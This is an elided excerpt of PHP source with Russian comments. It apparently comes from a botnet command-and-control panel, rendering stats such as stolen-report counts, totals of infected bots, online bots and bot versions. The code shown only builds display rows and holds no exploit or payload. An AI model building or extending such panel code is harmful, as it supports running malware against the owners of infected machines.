...
define('COUNTRYLIST_WIDTH', 320);  //Ширина колонки стран.
...
///////////////////////////////////////////////////////////////////////////////////////////////////
include('d.php');
$online = "<div id='ass' style='width:500px; height:400px;'></div>";
$vse = file_get_contents('http://localhost/stat.php');
...
if(!empty($userData['r_reports_db']))
{
  ...
  THEME_LIST_ROW_BEGIN.
    str_replace(array('{WIDTH}', '{TEXT}'), array('auto', LNG_STATS_TOTAL_REPORTS),              $i % 2 ? THEME_LIST_ITEM_INFO_L2 : THEME_LIST_ITEM_INFO_L1).
    str_replace(array('{WIDTH}', '{TEXT}'), array(STAT_WIDTH, numberFormatAsInt($reportsCount)), $i % 2 ? THEME_LIST_ITEM_INFO_R2 : THEME_LIST_ITEM_INFO_R1).
  THEME_LIST_ROW_END;
...
{
  $actionList = str_replace(array('{COLUMNS_COUNT}', '{TEXT}'), array(2, LNG_STATS_BOTNET_ACTIONS.THEME_STRING_SPACE.THEME_STRING_SPACE.
                            str_replace(array('{TEXT}',     '{JS_EVENTS}' ),       
 												 array(LNG_STATS_RESET_NEWBOTS, ' onclick="window.top.location.href=\'../svoi/statcountry.php'.'\';"'),                                                          
...
function getBotnetStats($botnet, $i)
{
  ...
  $data =
  THEME_LIST_ROW_BEGIN.
    str_replace(array('{WIDTH}', '{TEXT}'), array('auto', LNG_STATS_FIRST_BOT), $i == 0 ? THEME_LIST_ITEM_INFO_L1 : THEME_LIST_ITEM_INFO_L2).
    str_replace(array('{WIDTH}', '{TEXT}'), array(STAT_WIDTH, $tmp),            $i == 0 ? THEME_LIST_ITEM_INFO_R1 : THEME_LIST_ITEM_INFO_R2). //Пусть будет num.
  THEME_LIST_ROW_END.
  THEME_LIST_ROW_BEGIN.
    str_replace(array('{WIDTH}', '{TEXT}'), array('auto', LNG_STATS_TOTAL_BOTS),          $i == 0 ? THEME_LIST_ITEM_INFO_L2 : THEME_LIST_ITEM_INFO_L1).
    str_replace(array('{WIDTH}', '{TEXT}'), array(STAT_WIDTH, numberFormatAsInt($mt[1])), $i == 0 ? THEME_LIST_ITEM_INFO_R2 : THEME_LIST_ITEM_INFO_R1).
  THEME_LIST_ROW_END;
  ...
  $data .= 
  THEME_LIST_ROW_BEGIN.
    str_replace(array('{WIDTH}', '{TEXT}'), array('auto', LNG_STATS_TOTAL_BOTS24),                                                                                       $i == 0 ? THEME_LIST_ITEM_INFO_L1 : THEME_LIST_ITEM_INFO_L2).
    str_replace(array('{WIDTH}', '{TEXT}'), array(STAT_WIDTH, ($totalBots > 0 ? numberFormatAsFloat(($tmp * 100) / $totalBots, 2) : 0).'% -  '.numberFormatAsInt($tmp)), $i == 0 ? THEME_LIST_ITEM_INFO_R1 : THEME_LIST_ITEM_INFO_R2).
  THEME_LIST_ROW_END;
 
  //Максимальная и минимальная версия бота.
  $data .= 
  THEME_LIST_ROW_BEGIN.
    str_replace(array('{WIDTH}', '{TEXT}'), array('auto', LNG_STATS_TOTAL_MIN_VERSION),   $i == 0 ? THEME_LIST_ITEM_INFO_L2 : THEME_LIST_ITEM_INFO_L1).
    str_replace(array('{WIDTH}', '{TEXT}'), array(STAT_WIDTH, intToVersion($minVersion)), $i == 0 ? THEME_LIST_ITEM_INFO_R2 : THEME_LIST_ITEM_INFO_R1).
  THEME_LIST_ROW_END.
  THEME_LIST_ROW_BEGIN.
    str_replace(array('{WIDTH}', '{TEXT}'), array('auto', LNG_STATS_TOTAL_MAX_VERSION),   $i == 0 ? THEME_LIST_ITEM_INFO_L1 : THEME_LIST_ITEM_INFO_L2).
    str_replace(array('{WIDTH}', '{TEXT}'), array(STAT_WIDTH, intToVersion($maxVersion)), $i == 0 ? THEME_LIST_ITEM_INFO_R1 : THEME_LIST_ITEM_INFO_R2).
  THEME_LIST_ROW_END;
